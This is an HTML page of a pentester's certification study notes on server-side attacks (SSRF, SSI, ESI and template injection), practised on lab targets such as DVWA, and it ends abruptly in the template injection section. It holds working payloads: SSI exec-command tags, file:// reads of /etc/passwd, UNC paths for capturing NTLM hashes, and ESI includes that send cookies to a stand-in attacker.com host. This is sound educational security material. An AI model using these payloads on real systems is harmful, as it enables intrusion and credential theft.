@@ -1,0 +1,2021 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>11 - Server Side Attacks |</title>
+<meta name="description" content="SSRF, SSI, XSLT attacks and More ">
+
+
+  <meta name="author" content="Nullified">
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="">
+<meta property="og:title" content="11 - Server Side Attacks">
+<meta property="og:url" content="http://localhost:4000/notes/ewptx/serverside/">
+
+
+  <meta property="og:description" content="SSRF, SSI, XSLT attacks and More ">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/main/header2.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2023-12-03T00:00:00+06:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/notes/ewptx/serverside/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "john",
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title=" Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+<!-- favicon -->
+<link rel="icon" type="image/jpeg" sizes="32x32" href="/assets/images/main/fav-32x32.jpeg">
+<link rel="icon" type="image/jpeg" sizes="16x16" href="/assets/images/main/fav-16x16.jpeg">
+<meta name="theme-color" content="#ffffff">
+
+  </head>
+
+  <body class="layout--single single">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/main/kaizen.png" alt=""></a>
+        
+        <a class="site-title" href="/">
+          
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/">Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/menu">Menu</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about">About</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+  
+    
+
+    <div class="initial-content">
+      
+  
+
+
+
+
+
+
+
+<div class="page__hero--overlay"
+  style=" background-image: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('/assets/images/main/header2.jpg');"
+>
+  
+    <div class="wrapper">
+      <h1 id="page-title" class="page__title" itemprop="headline">
+        
+          11 - Server Side Attacks
+
+        
+      </h1>
+      
+        <p class="page__lead">SSRF, SSI, XSLT attacks and More
+</p>
+      
+      
+        <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  27 minute read
+
+</p>
+      
+      
+      
+    </div>
+  
+  
+</div>
+
+
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+  
+    
+      
+      
+      
+      
+    
+    
+      
+
+<nav class="nav__list">
+  
+  <input id="ac-toc" name="accordion-toc" type="checkbox" />
+  <label for="ac-toc">Toggle menu</label>
+  <ul class="nav__items">
+    
+      <li>
+        
+          <span class="nav__sub-title">Posts</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/insights/roadmap/">- How to become a Pentester (2024)</a></li>
+          
+            <li><a href="/awareness/awarenessdoc/">- Security Awareness</a></li>
+          
+            <li><a href="/c2/sliverbasics/">- Sliver C2 Basics</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+        </ul>
+        
+      </li>
+    
+      <li>
+        
+          <span class="nav__sub-title">Notes</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/notes/ejpt/">eJPT</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/ecppt/">eCPPTv2</a></li>
+          
+            <li><a href="/notes/ecppt/systemsecurity/">- System Security</a></li>
+          
+            <li><a href="/notes/ecppt/networksecurity/">- Network Security</a></li>
+          
+            <li><a href="/notes/ecppt/powershell/">- Powershell</a></li>
+          
+            <li><a href="/notes/ecppt/linux/">- Linux Security</a></li>
+          
+            <li><a href="/notes/ecppt/webapp/">- Web App Security</a></li>
+          
+            <li><a href="/notes/ecppt/wifi/">- Wi-Fi Pentest</a></li>
+          
+            <li><a href="/notes/ecppt/ruby/">- Metasploit & Ruby</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/pnpt/">PNPT</a></li>
+          
+            <li><a href="/notes/pnpt/peh/">- Practical Ethical Hacker</a></li>
+          
+            <li><a href="/notes/pnpt/osint/">- OSINT</a></li>
+          
+            <li><a href="/notes/pnpt/pentestexternal/">- External Pentest Playbook</a></li>
+          
+            <li><a href="/notes/pnpt/linuxprivesc/">- Linux Privesc</a></li>
+          
+            <li><a href="/notes/pnpt/winprivesc/">- Windows Privesc</a></li>
+          
+            <li><a href="/notes/pnpt/wpivoting/">- Movement, Pivoting and Persistence</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/eewptx/">eWPTXv2</a></li>
+          
+            <li><a href="/notes/ewptx/encoding/">- Encoding & Filtering</a></li>
+          
+            <li><a href="/notes/ewptx/evasionbasics/">- Evasion Basics</a></li>
+          
+            <li><a href="/notes/ewptx/xss/">- Cross-site scripting (XSS)</a></li>
+          
+            <li><a href="/notes/ewptx/xssfilter/">- XSS Filter Evasion</a></li>
+          
+            <li><a href="/notes/ewptx/csrf/">- Cross-site request forgery (CSRF)</a></li>
+          
+            <li><a href="/notes/ewptx/html5/">- HTML5</a></li>
+          
+            <li><a href="/notes/ewptx/sqli/">- SQL Injection</a></li>
+          
+            <li><a href="/notes/ewptx/sqlievasion/">- SQLI Filter Evasion</a></li>
+          
+            <li><a href="/notes/ewptx/xmlattacks/">- XML Attacks</a></li>
+          
+            <li><a href="/notes/ewptx/zattackingserialization/">- Attacking Serialization</a></li>
+          
+            <li><a href="/notes/ewptx/serverside/" class="active">- Server Side Attacks</a></li>
+          
+            <li><a href="/notes/ewptx/crypto/">- Attacking Crypto</a></li>
+          
+            <li><a href="/notes/ewptx/authenticationsso/">- Authentication & SSO</a></li>
+          
+            <li><a href="/notes/ewptx/apiscloud/">- APIs & Cloud Apps</a></li>
+          
+            <li><a href="/notes/ewptx/ldap/">- Attacking LDAP</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="">Active Directory Exploitation</a></li>
+          
+            <li><a href="/notes/adx/powershell/">- Powershell</a></li>
+          
+            <li><a href="/notes/adx/bloodhound/">- Bloodhound</a></li>
+          
+            <li><a href="/notes/adx/privesc/">- Win Privesc</a></li>
+          
+            <li><a href="/notes/adx/zlateralmov/">- Lateral Movement</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/crtp/">CRTP</a></li>
+          
+            <li><a href="/notes/crtp/enum/">- AD Enumeration</a></li>
+          
+            <li><a href="/notes/crtp/winprivesc/">- Local Privesc</a></li>
+          
+            <li><a href="/notes/crtp/latmov/">- Lateral Movement</a></li>
+          
+            <li><a href="/notes/crtp/offdotnet/">- Offensive .NET</a></li>
+          
+            <li><a href="/notes/crtp/domdom/">- AD Persistence</a></li>
+          
+            <li><a href="/notes/crtp/domprivesc/">- AD Privesc</a></li>
+          
+            <li><a href="/notes/crtp/defense/">- AD Defense</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/crte/">CRTE</a></li>
+          
+            <li><a href="/notes/crte/latmov/">- Lateral Movement</a></li>
+          
+            <li><a href="/notes/crte/adprivesc/">- AD Privesc</a></li>
+          
+            <li><a href="/notes/crte/adpersistence/">- AD Persistence</a></li>
+          
+            <li><a href="/notes/crte/cross/">- Cross attacks</a></li>
+          
+            <li><a href="/notes/crte/cheatsheet/">- Cheat Sheet</a></li>
+          
+        </ul>
+        
+      </li>
+    
+      <li>
+        
+          <span class="nav__sub-title">My CVEs</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/cve/xss/">CVE-2024-2479</a></li>
+          
+            <li><a href="/cve/sqli/">CVE-2024-2480</a></li>
+          
+        </ul>
+        
+      </li>
+    
+  </ul>
+</nav>
+
+    
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="11 - Server Side Attacks">
+    <meta itemprop="description" content="SSRF, SSI, XSLT attacks and More">
+    <meta itemprop="datePublished" content="2023-12-03T00:00:00+06:00">
+    
+
+    <div class="page__inner-wrap">
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu">
+  <li><a href="#server-side-attacks">Server-Side Attacks</a>
+    <ul>
+      <li><a href="#abusing-intermediate-devices">Abusing Intermediate Devices</a></li>
+      <li><a href="#ssrf-attack">SSRF Attack</a></li>
+      <li><a href="#server-side-include">Server-Side Include</a></li>
+      <li><a href="#edge-side-includes-esi">Edge Side Includes (ESI)</a></li>
+      <li><a href="#language-evaluation">Language Evaluation</a></li>
+      <li><a href="#expression-language--ognl-injection">Expression Language / OGNL injection</a></li>
+      <li><a href="#xslt-purpose">XSLT Purpose</a></li>
+      <li><a href="#lab-1---ssrf-to-rce">Lab 1 - SSRF to RCE</a></li>
+      <li><a href="#lab-2---xslt-to-code-execution">Lab 2 - XSLT to Code Execution</a></li>
+    </ul>
+  </li>
+</ul>
+
+            </nav>
+          </aside>
+        
+        <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="nullified" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
+
+<h1 id="server-side-attacks">Server-Side Attacks</h1>
+
+<ul>
+  <li>Server-Side Request Forgery</li>
+  <li>Server-Side Include</li>
+  <li>Language Evaluation</li>
+  <li>Attacking XSLT Engines</li>
+</ul>
+
+<p>Objectives:</p>
+
+<ul>
+  <li>Understanding how user input can be handled by back-end logic</li>
+  <li>Finding and Exploiting Server-Side bugs</li>
+</ul>
+
+<h2 id="abusing-intermediate-devices">Abusing Intermediate Devices</h2>
+<p>When Tomcat is combined with a Nginx reverse proxy, an insecure condition may occur; This is because Tomcat itself will treat <strong>..;/</strong> as if it was a parent directory traversal sequence <strong>../</strong> and normalize (sanitize) that sequence.</p>
+
+<ul>
+  <li>However, when relying on the reverse proxy For this task, the proxy might not do that, allowing For escaping <strong>up one directory</strong> because they will pass that path to Tomcat unchanged, and Tomcat will not perform additional validation since it relies on the reverse proxy to do it.</li>
+</ul>
+
+<p>Example:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://tomcatapplication.com/..;/manager/html 
+
+# might reveal the Tomcat Manager
+</code></pre></div></div>
+
+<p>Another opportunity to access the hidden Tomcat manager is <em>AJP Proxy</em>.</p>
+
+<ul>
+  <li>Usually running on port 8009 and is accompanied by Tomcat-based websites.</li>
+  <li>ajp13 is not a web app, its a binary protocol</li>
+  <li>However, ajp proxy might be a gateway to internal resources (administrative panels or unpublished websites)</li>
+</ul>
+
+<p>To connect to a remote ajp port, u need to have Apache installed on your system</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apt-get <span class="nb">install </span>apache2
+</code></pre></div></div>
+
+<p>Then u need to install the ajp-related module:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apt <span class="nb">install </span>libapache2-mod-jk
+</code></pre></div></div>
+
+<p>And enable it:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a2enmod proxy_ajp
+</code></pre></div></div>
+
+<p>Create a file path under the path: /etc/apache2/sites-enabled/ajp.conf</p>
+
+<p><img src="/assets/images/posts/ewptx/59.png" alt="Alt text" class="align-center" /></p>
+
+<p>Then restart apache. it should be able to visit the remote website at http://127.0.0.1.</p>
+
+<blockquote>
+  <p>Since the real web app server is hidden deep inside its infrastructure, the ability to know its real IP address can be a vuln itself.</p>
+</blockquote>
+
+<blockquote>
+  <p>It could be even better if one is able to issue a request on behalf of that server or in the most complex case, retrieve the results of such requests</p>
+</blockquote>
+
+<h2 id="ssrf-attack">SSRF Attack</h2>
+<p>Server-Side request forgery is an attack in which the user is able to make the application server (or a proxy or another part of its infra) issue a request For external resources</p>
+
+<p>The exploitation of SSRF can lead to:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Sensitive Information Disclosure
+- Stealing authentication information (Windows NTLM hashes)
+- File read/inclusion
+- Remote Code Execution
+</code></pre></div></div>
+
+<p>The most obvious places to look For:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- in Load profile picture from URL functionalities 
+- or similar features
+</code></pre></div></div>
+
+<p>The safest way to fetch a remote file by the target website would be to do it using client-side javascript. In such a case, the request is performed by the users computer and no application infrastructure takes part in requesting the remote resources.</p>
+
+<h3 id="when-ssrf-is-a-feature">When SSRF is a Feature</h3>
+<p>SSRF attack can be conducted not only against <strong>image import</strong> utilities but any mechanisms that rely on fetching remote resources. In web apps typically it can be:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- API specification imports (WSDL imports)
+- Other file imports
+- Connection to remote server (FTP)
+- **ping** or **alivecheck** utilities
+- Any parts of an http request that includes URLs
+</code></pre></div></div>
+
+<h3 id="blind-ssrf-exploitation">Blind SSRF Exploitation</h3>
+<p>Example: document generators</p>
+
+<p>If one is able to inject content into an online PDF generator, inserting something like the code below might likely lead to receiving a GET request from the parser server. Its because the server-side content parser will try to evaluate the content before rendering the PDF</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="nx">http</span><span class="p">:</span><span class="c1">//attacker.com:80/ssrf&gt;</span>
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>It will then parse the IMG tag and try to fetch the remote picture without knowing that it does not exist</p>
+  </li>
+  <li>
+    <p>SSRF payloads can be inserted in HTTP request headers. You can, For example, place your domain in any HTTP header and look For HTTP or DNS resolution</p>
+  </li>
+</ul>
+
+<blockquote>
+  <p>in BURP intruder u can feed it with a list of all HTTP headers and assign your domain to each of them. its possible that some of the intermediate proxies might try to resolve these domains.</p>
+</blockquote>
+
+<h4 id="url-structure">URL Structure</h4>
+<p>https://chromium.googlesource.com/chromium/src/+/master/docs/security/url_display_guidelines/url_display_guidelines.md</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://user:pass@sub.example.com:8080/path?query#fragment
+</code></pre></div></div>
+
+<h4 id="ssrf-example">SSRF Example</h4>
+<p>https://github.com/ethicalhack3r/DVWA</p>
+
+<p>We will use the <strong>File Inclusion</strong> module, which is similar to a web app fetch file functionalities. DVWA has to run in <strong>Low</strong> security mode.</p>
+
+<ul>
+  <li>We want to proxy our requets via BURP</li>
+</ul>
+
+<p>Install socat</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apt <span class="nb">install </span>socat
+</code></pre></div></div>
+
+<p>Then the DVWA is exposed via port forwarding using socat external port 800 will be connected to internal 80. This will expose ur vuln app to the outside world</p>
+
+<p>Forward:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>socat tcp-listen:800,fork tcp:127.0.0.1:80
+
+<span class="c"># Now its exposed </span>
+</code></pre></div></div>
+
+<p>We can try to start a listener in netcat and fetch its address via a GET request</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /DVWA/vulnerabilities/f?page=http://test:pwd@127.0.0.1:21/a HTTP/1.1
+</code></pre></div></div>
+
+<h3 id="forcing-authentication">Forcing Authentication</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nv -lvnp 21
+
+# the back-end used the username:password combination as a Basic Authentication header! 
+# This means, when issuing an arbitrary request, we can also do it to like basic authentication protected resources
+</code></pre></div></div>
+
+<h3 id="changing-protocol">Changing Protocol</h3>
+<p>DVWA also accepts an https URL scheme and tries to establish an encrypted connection:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /DVWA/vulnerabilities/f?page=https://test:pwd@127.0.0.1:21/ssl HTTP/1.1
+</code></pre></div></div>
+
+<p>Since we are using a plaintext connection netcat, we just see the attempt to establish SSL to our listener</p>
+
+<p>The ‘file://’ scheme is also accepted, resulting in file inclusion.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /DVWA/vulnerabilities/f?file=http:///etc/passwd HTTP/1.1
+</code></pre></div></div>
+
+<p>You can always test more protocols handlers</p>
+
+<p>https://www.php.net/manual/en/wrappers.php</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- file:// <span class="c"># accessing local filesystem</span>
+- http:// <span class="c"># accessing HTTP(s) URLs</span>
+- ftp://  <span class="c"># accessing FTP(s) URLs</span>
+- php://  <span class="c"># accessing various I/O streams</span>
+- zlib:// <span class="c"># compression streams</span>
+- data:// <span class="c"># data (RFC 2397)</span>
+- glob:// <span class="c"># find pathnames matching patterns</span>
+- phar:// <span class="c"># php archive</span>
+- ssh2:// <span class="c"># secure shell 2</span>
+- rar://  <span class="c"># rar</span>
+- ogg://  <span class="c"># audio streams</span>
+- expect:// <span class="c"># process interaction streams</span>
+</code></pre></div></div>
+
+<h3 id="attacking-ssrf-on-windows">Attacking SSRF on Windows</h3>
+<p>You can try to access a UNC path in the following format:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">file</span><span class="p">:</span><span class="c1">///\\attackerdomain\sharename</span>
+</code></pre></div></div>
+
+<ul>
+  <li>https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/62e862f4-2a51-452e-8eeb-dc4ff5ee33cc</li>
+</ul>
+
+<p>If the server tries to authenticate to a fake share, you might be able to steal its NTLM password hash. The hash can be subject to further offline cracking.</p>
+
+<p>SMB authentication attempts can be captured (e.g. using the metasploit module)</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>auxiliary/server/capture/smb
+</code></pre></div></div>
+
+<h3 id="other-ssrf-scenarios">Other SSRF Scenarios</h3>
+<p>Sometimes, it will be possible to fetch a remote HTML file.</p>
+
+<p>So, SSRF will lead to Reflected XSS:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>xss.html
+<span class="c"># &lt;script&gt;alert(document.domain)&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>Upon visiting the URL, the remote HTML file is included by the server</p>
+</blockquote>
+
+<h3 id="time-based-ssrf">Time-based SSRF</h3>
+<p>Used especially in Blind exploitation scenarios</p>
+
+<ul>
+  <li>Based on differences in response time, one may be able to perform an internal port scan or internal network/domain discovery</li>
+</ul>
+
+<h3 id="extending-ssrf">Extending SSRF</h3>
+<p>What can we get:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- RCE (best scenario)
+- File inclusion
+- Reading sensitive data
+- Interact with internal services
+# Even executing only GET requests, 
+# its enough to execute critical actions on internal services and execute arbritrary code.
+</code></pre></div></div>
+
+<h2 id="server-side-include">Server-Side Include</h2>
+<p>Its a language-neutral web server technology that supports creating dynamic content before rendering the page.</p>
+
+<ul>
+  <li>when the web app makes use of <strong>.shtml</strong>, <strong>.shtm</strong> or <strong>.stm</strong> pages</li>
+</ul>
+
+<p>The best options is to inject examplary SSI tags into the web app and observer the place where they are rendered.</p>
+
+<blockquote>
+  <p>U can add examplary of SSI payloads in the BURP intruder list</p>
+</blockquote>
+
+<h3 id="ssi-expressions">SSI Expressions</h3>
+<p>Example:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!--</span><span class="err">#</span><span class="nx">directive</span> <span class="nx">param</span><span class="o">=</span><span class="dl">"</span><span class="s2">value</span><span class="dl">"</span><span class="o">--</span> <span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>You can try to execute commands For printing server-side variables:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!--</span><span class="err">#</span><span class="nx">echo</span> <span class="kd">var</span><span class="o">=</span><span class="dl">"</span><span class="s2">DOCUMENT NAME</span><span class="dl">"</span><span class="o">--</span> <span class="o">&gt;</span>
+<span class="c">&lt;!--</span><span class="err">#</span><span class="nx">echo</span> <span class="kd">var</span><span class="o">=</span><span class="dl">"</span><span class="s2">DATE LOCAL</span><span class="dl">"</span><span class="o">--</span> <span class="o">&gt;</span>
+<span class="c">&lt;!--</span><span class="err">#</span><span class="nx">include</span> <span class="nx">virtual</span><span class="o">=</span><span class="dl">"</span><span class="s2">/index.html</span><span class="dl">"</span><span class="o">--</span> <span class="o">&gt;</span>
+<span class="c">&lt;!--</span><span class="err">#</span><span class="nx">exec</span> <span class="nx">cmd</span><span class="o">=</span><span class="dl">"</span><span class="s2">dir</span><span class="dl">"</span><span class="o">--</span> <span class="o">&gt;</span>
+<span class="c">&lt;!--</span><span class="err">#</span><span class="nx">exec</span> <span class="nx">cmd</span><span class="o">=</span><span class="dl">"</span><span class="s2">ls</span><span class="dl">"</span><span class="o">--</span> <span class="o">&gt;</span>
+</code></pre></div></div>
+
+<h3 id="ssi-practice">SSI Practice</h3>
+<p>You can practice here:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.owasp.org/index.php/OWASP_Broken_Web_Applications_Project
+</code></pre></div></div>
+
+<h2 id="edge-side-includes-esi">Edge Side Includes (ESI)</h2>
+<p>Proxies and other similar intermediate infrastructure utilize them</p>
+
+<ul>
+  <li>modern web app often consist of several intermediate server before users requests reach the end application server. We should try to interact with such intermediate infrastructure by injecting some ESI tags to our requests</li>
+  <li>
+    <p>ESI has a form of XML Tags, which are dynamically added to cached static content in order to enrich them with some dynamic features.</p>
+  </li>
+  <li>The ESI Tags are injected by cache mechanisms For other cache mechanisms; However, if a user is able to add ESI tags to the HTTP request, the proxies might parse it without knowing its origin.</li>
+</ul>
+
+<p><img src="/assets/images/posts/ewptx/60.png" alt="Alt text" class="align-center" /></p>
+
+<h3 id="esi-expressions">ESI Expressions</h3>
+<p>Example:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">esi</span><span class="p">:</span><span class="nx">include</span> <span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">/weather/name?id=$(QUERY_STRING{city_id})</span><span class="dl">"</span><span class="o">/&gt;</span>
+</code></pre></div></div>
+
+<h3 id="esi-detection">ESI Detection</h3>
+<p>In most cases, using a Blind Attack approach</p>
+
+<p>If u see the header:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Surrogate-Control: content="ESI/1.0"
+# in this case, u can suspect that ESI is in use. 
+# However, in most cases, there will be no sign of using ESI
+</code></pre></div></div>
+
+<p>To detect with Blind approach, the user can try to inject tags that cause the proxies to resolve arbitrary addresses resulting in SSRF:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;esi:include src=http://attacker.com/&gt;
+</code></pre></div></div>
+
+<h3 id="esi-exploitation">ESI Exploitation</h3>
+<p>Might be possible to include a HTML file resulting in XSS:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">esi</span><span class="p">:</span><span class="nx">include</span> <span class="nx">src</span><span class="o">=</span><span class="nx">http</span><span class="p">:</span><span class="c1">//attacker.com/xss.html&gt;</span>
+</code></pre></div></div>
+
+<p>The xss.html can contain similar code:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
+</span></code></pre></div></div>
+
+<p>Exfiltrate cookies directly by referring to a special variable:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">esi</span><span class="p">:</span><span class="nx">include</span> <span class="nx">src</span><span class="o">=</span><span class="nx">http</span><span class="p">:</span><span class="c1">//attacker.com/$(HTTP_COOKIE)&gt;</span>
+<span class="err">#</span> <span class="nx">which</span> <span class="nx">can</span> <span class="nx">bypass</span> <span class="nx">the</span> <span class="nx">httpOnly</span> <span class="nx">flag</span> <span class="k">in</span> <span class="k">case</span> <span class="k">of</span> <span class="nx">its</span> <span class="nx">presence</span>
+</code></pre></div></div>
+
+<p>There is a possibility For RCE when the app has support For XSLT</p>
+
+<ul>
+  <li>XLST is a dynamic language used to transform XML files according to a specific pattern</li>
+</ul>
+
+<p>The Payload For the ESI Injection to the XSLT execution:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">esi</span><span class="p">:</span><span class="nx">include</span> <span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://attacker.com/file.xml</span><span class="dl">"</span> <span class="nx">dca</span><span class="o">=</span><span class="dl">"</span><span class="s2">xslt</span><span class="dl">"</span> <span class="nx">stylesheet</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://attacker.com/transformation.xsl</span><span class="dl">"</span> <span class="o">/&gt;</span>
+</code></pre></div></div>
+
+<p>Moreover:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection
+- https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations
+</code></pre></div></div>
+
+<h2 id="language-evaluation">Language Evaluation</h2>
+<p>Includes:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Double evaluation
+- Server-side Template Injections
+- Expression language injections
+</code></pre></div></div>
+
+<blockquote>
+  <p>All caused by users ability to force the target application server to execute arbritrary programmistic code. This code is always in form of an expression</p>
+</blockquote>
+
+<h3 id="template-engines">Template Engines</h3>
+<p>Similar to the SSI, some web apps use template systems to enable dynamic content generation into their pages:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">$template</span><span class="o">-&gt;</span><span class="nf">render</span><span class="p">(</span><span class="dl">"</span><span class="s2">Hello ${user_name}!</span><span class="dl">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>The expression <strong>${}</strong> = the Template Expression</p>
+</blockquote>
+
+<p>which holds the <em>user_name</em> variable. We dont know the origin of the user_name;</p>
+
+<p>Presumably its generated server-side (during login). Using the template engine, its possible to dynamically print that user name on the login page</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">$template</span><span class="o">-&gt;</span><span class="nf">render</span><span class="p">(</span><span class="dl">"</span><span class="s2">Hello $_GET['user_name']!</span><span class="dl">"</span><span class="p">)</span>
